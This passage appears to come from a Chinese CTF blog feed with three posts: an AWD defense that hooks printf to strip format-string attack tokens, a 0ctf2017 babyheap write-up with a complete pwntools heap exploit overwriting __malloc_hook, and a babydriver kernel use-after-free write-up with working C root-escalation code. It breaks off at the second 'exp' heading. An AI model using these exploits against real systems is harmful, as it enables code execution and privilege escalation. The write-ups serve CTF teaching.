&quot;LIBDHEAP_EXIT_ON_ERROR=1&quot;,NULL&#125;;//传递给执行文件新的环境变量数组  </div><div class="line">    execve(&quot;./test&quot;,argv,envp);  </div><div class="line">   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>LIBDHEAP_EXIT_ON_ERROR=1</code>  检测到异常后就会退出。</p>
<p><strong>格式化字符串</strong></p>
<p>hook <code>printf</code>  和 <code>snprintf</code>过滤关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdarg.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">// gcc -shared -fPIC my_printf.c -o libmy_printf.so -ldl</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line"></div><div class="line"></div><div class="line">int fd = 0;</div><div class="line"></div><div class="line">void log (char * buf) &#123;</div><div class="line"></div><div class="line">	if(!fd)&#123;</div><div class="line">		fd = open(&quot;log.txt&quot;, O_WRONLY|O_CREAT|O_APPEND);</div><div class="line">	&#125;</div><div class="line">  write(fd, buf, strlen(buf));</div><div class="line">  write(fd, &apos;\n&apos;, 1);</div><div class="line">  sync();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void str_remove(char *src, char *target)&#123;</div><div class="line"></div><div class="line">        char *p;    </div><div class="line">        char c[81];</div><div class="line">        char *dst[254]=&#123;0&#125;;</div><div class="line">        while((p = strstr(src,target)) != NULL) &#123; //strstr 找不到返回 NULL </div><div class="line">                *p = &apos;\0&apos;; // 指定连接下一步（连接函数）之前 a 的终止位置； </div><div class="line">                strcpy (c, p+strlen(target)); // strcat 函数中的两个传入参数的内存地址不能重叠，所以这里用 c 当作 temp </div><div class="line">                strcat (src, c);</div><div class="line">        &#125; </div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int printf(const char *format, ...)</div><div class="line">&#123;</div><div class="line">        va_list list;</div><div class="line">        char *parg;</div><div class="line">        typeof(printf) *old_printf;</div><div class="line"></div><div class="line">        char *tmp = malloc(strlen(format) + 1);</div><div class="line">        strcpy(tmp, format);</div><div class="line"></div><div class="line">        </div><div class="line"></div><div class="line">        /*</div><div class="line"></div><div class="line">        remove some bad string</div><div class="line"></div><div class="line">        */</div><div class="line">        str_remove(tmp, &quot;$p&quot;);</div><div class="line">        str_remove(tmp, &quot;$x&quot;);</div><div class="line">        str_remove(tmp, &quot;hn&quot;);</div><div class="line">        str_remove(tmp, &quot;ln&quot;);</div><div class="line">        str_remove(tmp, &quot;$n&quot;);</div><div class="line">        log(tmp);</div><div class="line"></div><div class="line">        // format variable arguments</div><div class="line">        va_start(list, tmp);</div><div class="line">        vasprintf(&amp;parg, tmp, list);</div><div class="line">        va_end(list);</div><div class="line"></div><div class="line">        // get a pointer to the function &quot;printf&quot;</div><div class="line">        old_printf = dlsym(RTLD_NEXT, &quot;printf&quot;);</div><div class="line">        (*old_printf)(&quot;%s&quot;, parg); // and we call the function with previous arguments</div><div class="line"></div><div class="line">        free(parg);</div><div class="line">        free(tmp);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">int snprintf(char *str, size_t size, const char *format, ...)&#123;</div><div class="line">        va_list list;</div><div class="line">        char *parg;</div><div class="line">        typeof(snprintf) *old_snprintf;</div><div class="line"></div><div class="line">        char *tmp = malloc(strlen(format) + 1);</div><div class="line">        strcpy(tmp, format);</div><div class="line"></div><div class="line">        /*</div><div class="line"></div><div class="line">        remove some bad string</div><div class="line"></div><div class="line">        */</div><div class="line">        str_remove(tmp, &quot;$p&quot;);</div><div class="line">        str_remove(tmp, &quot;$x&quot;);</div><div class="line">        str_remove(tmp, &quot;hn&quot;);</div><div class="line">        str_remove(tmp, &quot;ln&quot;);</div><div class="line">        str_remove(tmp, &quot;$n&quot;);</div><div class="line">        log(tmp);</div><div class="line"></div><div class="line">        // format variable arguments</div><div class="line">        va_start(list, tmp);</div><div class="line">        vasprintf(&amp;parg, tmp, list);</div><div class="line">        va_end(list);</div><div class="line">        </div><div class="line">        // get a pointer to the function &quot;printf&quot;</div><div class="line">        old_snprintf = dlsym(RTLD_NEXT, &quot;snprintf&quot;);</div><div class="line">        (*old_snprintf)(str, size, &quot;%s&quot;, parg); // and we call the function with previous arguments</div><div class="line"></div><div class="line">        free(parg);</div><div class="line">        free(tmp);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -shared -fPIC my_printf.c -o libmy_printf.so -ldl</div></pre></td></tr></table></figure></p>
<p>编译之（<code>32</code> 位 加 <code>-m 32</code>）</p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> awd </tag>
            
            <tag> pwn_defense </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[0ctf2017-babyheap]]></title>
      <url>/2017/12/18/0ctf2017_babyheap.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又是一道令人怀疑人生的 <code>baby</code> 题。</p>
<p>这道题利用思路非常巧妙,通过 <code>堆溢出</code> 和 <code>fastbin</code> 的机制构造了 <code>information leak</code>, 然后通过 <code>fastbin attack</code> 可以读写 <code>malloc_hook</code> , 然后使用 <code>one_gadget</code> 来 <code>getshell</code>.</p>
<p>题目和 idb 文件：<a href="https://gitee.com/hac425/blog_data/tree/master/babyheap" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/babyheap</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序涉及的结构体 <code>info</code> 的结构如下，可以通过 <code>allocate</code> 功能逆出来<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151359802954748asgou8.png?imageslim" alt="paste image"></p>
<p>程序首先 <code>mmap</code> 了一个 随机的地址，用于存放 <code>info table</code>（就是存储<code>info</code>的数组）.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/151359791301977g5486x.png?imageslim" alt="paste image"></p>
<p>程序的漏洞在于，在 <code>allocate</code> 时程序根据我们的输入 分配 <code>size</code> （size &lt; 0x1000）大小的块。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513598177039adb3rvos.png?imageslim" alt="paste image"></p>
<p>然而 在 <code>fill</code> 我们可以写入任意大小的数据</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513600309457yh3juekn.png?imageslim" alt="paste image"></p>
<p>经典的堆溢出。</p>
<p>问题在于，程序保护全开，而且 <code>info table</code>  的地址还是随机的，而且分配内存时，用的时 <code>calloc</code> 会把内存初始化为0。 所以常用的 <code>大chunk包含小chunk</code> 的信息泄露方式没法使用。</p>
<p>这里通过将 <code>堆溢出</code> 转换为  <code>uaf</code> 来进行信息泄露。</p>
<p>首先分配 多个 <code>chunk</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15136011014075wn0qsjc.png?imageslim" alt="paste image"></p>
<p>然后释放 偏移为 <code>1,3</code>的块，它们会进入 <code>fastbin</code>,然后通过部分溢出<code>chunk 2</code> 使得下面那个 <code>fastbin</code> 的 <code>fd</code> 指向下面那个大的块，然后溢出 <code>chunk 4</code> 修改其大小为 <code>0x21</code> 来 <code>bypass</code> 掉 <code>fastbin</code> 分配的 <code>check</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513601149909iwlr22xb.png?imageslim" alt="paste image"></p>
<p>然后分配两次我们就能再次拿到这个 大的 <code>chunk</code>, 代码如下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513601356365qsp2ooav.png?imageslim" alt="paste image"><br>因为此时我们还没有得到任何 地址，不过各个 <code>chunk</code> 的相对偏移应该是固定的，只要内存的分配顺序，大小没有变化，所以我们可以通过修改 <code>fd</code> 的低字节(小端字节序）就能 使 <code>fd</code> 指向我们的 <code>大chunk</code>。</p>
<p>此时我们在把 <code>大chunk</code>的 <code>size</code> 修复，然后 用 <code>free</code> 刚刚分配的 <code>info</code>，它就会进入 <code>unsorted bin</code> ,此时在 <code>chunk+0x10</code> 处就有了 <code>main_arean</code> 的地址 （<code>unsorted bin</code>的 指针），然后用另外一个 <code>info</code> 打印内容即可 <code>leak</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15136016779927ug8wun3.png?imageslim" alt="paste image"></p>
<p>费劲千辛万苦我们终于拿到了 <code>libc</code> 的地址，对于这种全开的一般想到的就是修改 <code>__malloc_hook</code> 或者 <code>__free_hook</code>, 问题来了，怎么修改。</p>
<p>又是一种新的思路。我们可以在 <code>__malloc_hook</code> 附近找到合适的位置，进行 <code>fastbin attack</code>. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">x/4gx (long long)(&amp;main_arena)-0x40+0xd</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15136019955895srgx1x3.png?imageslim" alt="paste image"><br>如果以这里为一个 <code>chunk</code> ，这个 <code>chunk</code> 应该被放到 <code>0x70</code> 大小的 <code>fastbin</code> 里面。所以接下来的利用思路就是，构造一个 <code>0x70</code> 大小的 <code>fastbin</code> , 然后溢出修改 <code>fd</code> 到这个 <code>chunk</code> ,分配两次我们就能读写 <code>__malloc_hook</code>了，修改它为 <code>one_gadget</code>即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15136025454127tpb4ti1.png?imageslim" alt="paste image"><br>还有一个小 <code>tips</code> ，之前 <code>uaf</code> 的时候还有一块 <code>0x110</code> 的 <code>chunk</code> 在 <code>unsorted bin</code>, 所以我们需要先把这块内存给分配掉，然后在 进行布局。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p><code>one_gadget</code> 一个一个试，与寄存器和内存数据的状态有关。利用 <code>main_arean</code> 的数据进行 <code>fastbin attack</code> 这个 思路强悍。</p>
<p><strong>参考</strong></p>
<p><a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="external">http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from time import sleep</div><div class="line"></div><div class="line"># x/4gx (long long)(&amp;main_arena)-0x40+0xd</div><div class="line"></div><div class="line">def allocate(size):</div><div class="line">	p.recvuntil(&quot;Command:&quot;)</div><div class="line">	p.sendline(&quot;1&quot;)</div><div class="line">	p.recvuntil(&quot;Size:&quot;)</div><div class="line">	p.sendline(str(size))</div><div class="line">	sleep(0.1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def fill(index, content):</div><div class="line">	p.recvuntil(&quot;Command:&quot;)</div><div class="line">	p.sendline(&quot;2&quot;)</div><div class="line">	p.recvuntil(&quot;Index:&quot;)</div><div class="line">	p.sendline(str(index))</div><div class="line">	p.recvuntil(&quot;Size:&quot;)</div><div class="line">	p.sendline(str(len(content)))</div><div class="line">	p.recvuntil(&quot;Content:&quot;)</div><div class="line">	p.send(content)</div><div class="line">	sleep(0.1)</div><div class="line"></div><div class="line"></div><div class="line">def free(index):</div><div class="line">	p.recvuntil(&quot;Command:&quot;)</div><div class="line">	p.sendline(&quot;3&quot;)</div><div class="line">	p.recvuntil(&quot;Index:&quot;)</div><div class="line">	p.sendline(str(index))</div><div class="line">	sleep(0.1)</div><div class="line"></div><div class="line"></div><div class="line">def dump(index):</div><div class="line">	p.recvuntil(&quot;Command:&quot;)</div><div class="line">	p.sendline(&quot;4&quot;)</div><div class="line">	p.recvuntil(&quot;Index:&quot;)</div><div class="line">	p.sendline(str(index))</div><div class="line">	p.recvuntil(&quot;Content: \n&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./0ctfbabyheap&quot;)</div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p,&apos;&apos;&apos;</div><div class="line"></div><div class="line">c</div><div class="line"></div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line">allocate(0x10)  # 0</div><div class="line">allocate(0x10)	# 1</div><div class="line">allocate(0x10)	# 2</div><div class="line">allocate(0x10)	# 3</div><div class="line">allocate(0x10)	# 4</div><div class="line">allocate(0x100)	# 5</div><div class="line">allocate(0x10)  # 6</div><div class="line">allocate(0x10)  # 7</div><div class="line"></div><div class="line">log.info(&quot;allocat some chunk, large in chunk 5&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">free(1)</div><div class="line">free(3)</div><div class="line"></div><div class="line">log.info(&quot;free 1, 3&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line">payload = &quot;A&quot; *0x10</div><div class="line">payload += p64(0)</div><div class="line">payload += p64(0x0000000000000021)</div><div class="line">payload += &quot;\xa0&quot;</div><div class="line">fill(2, payload)</div><div class="line">log.info(&quot;modify chunk 3 &apos;s fastbin ptr, to 0xa0&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line"></div><div class="line">payload = &quot;A&quot; *0x10</div><div class="line">payload += p64(0)</div><div class="line">payload += p64(0x0000000000000021)</div><div class="line">fill(4, payload)</div><div class="line"></div><div class="line">log.info(&quot;modify chunk 5 &apos;s size to 0x21 for bypass check&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line">allocate(0x10)  # 1</div><div class="line">allocate(0x10)  # 3, get large bin</div><div class="line"></div><div class="line">log.info(&quot;now allocate 2 chunk to get the large bin&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line">payload = &quot;A&quot; *0x10</div><div class="line">payload += p64(0)</div><div class="line">payload += p64(0x00000000000000111)</div><div class="line">fill(4, payload)</div><div class="line"></div><div class="line">log.info(&quot;resume large chunk size&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line"></div><div class="line">free(3)</div><div class="line">log.info(&quot;free the large bin, and our chunk 5 in unsorted bin&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line">dump(5)</div><div class="line"></div><div class="line">addr = u64(p.recv(8))</div><div class="line">libc = addr - 0x3c4b78</div><div class="line">one_gadget = libc + 0x4526a</div><div class="line">log.info(&quot;libc: &quot; + hex(libc))</div><div class="line">log.info(&quot;one_gadget: &quot; + hex(one_gadget))</div><div class="line">#pause()</div><div class="line"></div><div class="line"></div><div class="line">allocate(0x100) # 3</div><div class="line"></div><div class="line">allocate(0x60) # 8</div><div class="line">free(8)</div><div class="line">payload = &quot;A&quot; *0x10</div><div class="line">payload += p64(0)</div><div class="line">payload += p64(0x0000000000000071)</div><div class="line">payload += p64(libc + 0x3c4aed)   # fake fastbin 0x70 size</div><div class="line">fill(7, payload)</div><div class="line">log.info(&quot;fake fastbin&quot;)</div><div class="line">#pause()</div><div class="line"></div><div class="line">allocate(0x60) # 8</div><div class="line">allocate(0x60) # 9</div><div class="line"></div><div class="line">log.info(&quot;now chunk 9 on &quot; + hex(libc + 0x3c4aed))</div><div class="line"></div><div class="line">payload = &quot;A&quot; * 19</div><div class="line">payload += p64(one_gadget)  # modify malloc hook</div><div class="line">fill(9, payload)</div><div class="line"></div><div class="line">allocate(0x10)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fastbin attack </tag>
            
            <tag> uaf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux_kernel_uaf漏洞利用实战]]></title>
      <url>/2017/12/18/linux_kernel_uaf_exploit.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好像是国赛的一道题。一个 <code>linux</code> 的内核题目。漏洞比较简单，可以作为入门。</p>
<p>题目链接: <a href="https://gitee.com/hac425/blog_data/blob/master/babydriver_0D09567FACCD2E891578AA83ED3BABA7.tar" target="_blank" rel="external">在这里</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目给了3个文件</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568679114vw66vm9k.png?imageslim" alt="paste image"></p>
<p>分配是 根文件系统 ， 内核镜像， 启动脚本。解压运行 <code>boot.sh</code> 即可。 <code>vmware</code> 需要开启一个选项。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568739772tfmi3nva.png?imageslim" alt="paste image"></p>
<p>使用 <code>lsmod</code> 可以找到加载的内核模块，以及它的加载地址。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513568821368hkanluaq.png?imageslim" alt="paste image"><br>多次启动发现，地址都没有变化，说明没有开启 <code>kaslr</code> ,从 <code>boot.sh</code> 中查看 <code>qemu</code> 启动选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</div></pre></td></tr></table></figure>
<p>发现开启了 <code>smep</code>.</p>
<p>然后解压 <code>rootfs.cpio</code>, 拿出内核模块文件，用 <code>ida</code> 分析之。</p>
<p>使用</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569109927l3as9qor.png?imageslim" alt="paste image"></p>
<p>解开 <code>rootfs.cpis</code> ，可以使用 <code>find</code> 命令搜索 <code>babydriver</code>, 可知 内核模块文件位于 <code>lib/modules/4.4.72/babydriver.ko</code>, 然后放到 <code>ida</code> 里面分析即可。</p>
<p>使用 <code>open</code> 开启设备时会，分配一块内存到 <code>babydev_struct.device_buf</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15135693016061fjw1ur0.png?imageslim" alt="paste image"></p>
<p>关闭设备时会直接 <code>kfree</code> 掉 <code>babydev_struct.device_buf</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569353266d64hcmf1.png?imageslim" alt="paste image"></p>
<p><code>read</code> 和 <code>write</code> 非常正常的操作。</p>
<p><code>ioctl</code> 时我们可以让 驱动 重新分配我们想要的大小的内存。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513569436033sy1xc56v.png?imageslim" alt="paste image"></p>
<p>程序的漏洞在于 <code>babydev_struct</code> 是一个全局变量，所以如果我们打开两次该设备，就会有两个 <code>fd</code> 可以操作这个结构体，然后释放掉一个，另外剩下的那个就会指向一块已经 <code>free</code> 掉的内存， <code>UAF</code>.</p>
<p>由于开启了 <code>smep</code> ，我们不能使用 <code>ret2user</code>的攻击方式。下面介绍两种利用方法。</p>
<p><strong>修改 cred </strong></p>
<ul>
<li><p>进程的权限由 <code>uid</code> 决定，所以我们可以通过 <code>ioctl</code> 分配和 <code>cred</code>结构体同样大小的内存块</p>
</li>
<li><p>然后触发漏洞，<code>free</code> 掉它，接着通过 <code>fork</code> 创建进程，这样该进程的 <code>cred</code> 结构体就会使用刚刚 <code>free</code> 掉的内存。</p>
</li>
<li><p>而此时我们可以使用 <code>babydriver</code> 的 <code>write</code> 功能修改这块内存。</p>
</li>
<li><p>我们可以修改 <code>cred</code> 结构体中代表 <code>uid</code> 的区域 为 <code>0</code>,就实现了 <code>root</code></p>
</li>
</ul>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">#include &lt;pthread.h&gt;</div><div class="line"></div><div class="line">#define CRED_SIZE 168</div><div class="line">#define DEV_NAME &quot;/dev/babydev&quot;</div><div class="line"></div><div class="line">char buf[100];</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    int fd1, fd2, ret;</div><div class="line">    char zero_buf[100];</div><div class="line">    memset(zero_buf, 0, sizeof(char) * 100);</div><div class="line">    fd1 = open(DEV_NAME, O_RDWR);</div><div class="line">    fd2 = open(DEV_NAME, O_RDWR);</div><div class="line">    // 首先通过ioctl改变第一次open的内存大小，使其和cred结构体一样大小</div><div class="line">    ret = ioctl(fd1, 0x10001, CRED_SIZE);</div><div class="line">    // release第一次open，释放一个cred结构体一样大小的内存</div><div class="line">    close(fd1);</div><div class="line">    // fork一个新进程来创建一个cred结构体，这个cred结构体就会用刚刚释放的内存，即UAF内存空间</div><div class="line">    int now_uid = 1000; // 当前uid为1000</div><div class="line">    int pid = fork();</div><div class="line">    if (pid &lt; 0) &#123;</div><div class="line">        perror(&quot;fork error&quot;);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (!pid) &#123;</div><div class="line">        // 写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</div><div class="line">        ret = write(fd2, zero_buf, 28);</div><div class="line">        now_uid = getuid();</div><div class="line">        if (!now_uid) &#123;</div><div class="line">            printf(&quot;get root done\n&quot;);</div><div class="line">            // 权限修改完毕，启动一个shell，就是root的shell了</div><div class="line">            system(&quot;/bin/sh&quot;);</div><div class="line">            exit(0);</div><div class="line">        &#125; else &#123;</div><div class="line">            puts(&quot;failed?&quot;);</div><div class="line">            exit(0);</div><div class="line">        &#125;</div><div class="line">    &#125; else &#123;</div><div class="line">        wait(NULL);</div><div class="line">    &#125;</div><div class="line">    close(fd2);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>利用tty_struct</strong></p>
<p><code>smep</code> 只是不能执行用户态的代码，我们还是可以使用 用户态的数据的。我们可以通过 <code>rop</code> 来关闭 <code>smep</code>, 然后再在使用 <code>ret2user</code> 的技术进行提权。</p>
<p>首先我们需要控制 <code>rip</code>, 可以通过 触发 <code>uaf</code> 后，多次分配 <code>tty_struct</code> 来占坑，然后使用 <code>write</code> 修改 <code>tty_operations</code> 的指针到我们伪造的 <code>tty_operations</code> 结构体 就可以控制 <code>rip</code> 了。</p>
<p>要进行 <code>rop</code> 我们需要一个可控的 栈 。</p>
<p>这里使用 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574135523zry5hfcd.png?imageslim" alt="paste image"><br>因为在调用 <code>tty_operations</code> 里面的函数时，最后一步是 <code>call rax</code>, 所以进入到这里时 的 <code>rax</code> 就为 <code>0xffffffff81007808</code> 这是一个 内核的内存地址，不过它的低 <code>32</code> 位,也即 <code>eax</code> 为 <code>0x81007808</code>,是一个 用户态的地址，我们是可以通过 <code>mmap</code> 拿到的，所以思路就是，首先通过 <code>mmap</code> 在 <code>0x81007808</code> 处布置好 <code>rop_chain</code> 然后 设置 <code>tty_operations</code>  里面的其中一个函数指针为 <code>xchg esp,eax</code> 的地址，然后调用之，就会进入 <code>rop</code> 了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574511704as7xnbvd.png?imageslim" alt="paste image"></p>
<p><code>xchg esp,eax</code>之后，可以发现 <code>rsp</code> 被劫持到我们可控的数据区了，接下来就是通过 <code>rop</code> 关闭 <code>semp</code>, 然后 <code>ret2user</code> 提权即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513574411861iv40raps.png?imageslim" alt="paste image"></p>
<p><strong>exp</strong></p>
